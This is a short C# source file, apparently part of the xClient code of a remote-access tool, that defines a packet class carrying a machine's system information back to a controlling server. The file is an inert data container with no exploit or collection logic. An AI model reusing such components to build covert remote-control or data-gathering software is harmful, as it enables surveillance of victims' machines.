using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ClientPackets;

[Serializable]
public class GetSystemInfoResponse : IPacket
{
	public string[] SystemInfos { get; set; }

	public GetSystemInfoResponse()
	{
	}

	public GetSystemInfoResponse(string[] systeminfos)
	{
		SystemInfos = systeminfos;
	}

	public void Execute(Client client)
	{
		client.Send(this);
	}
}
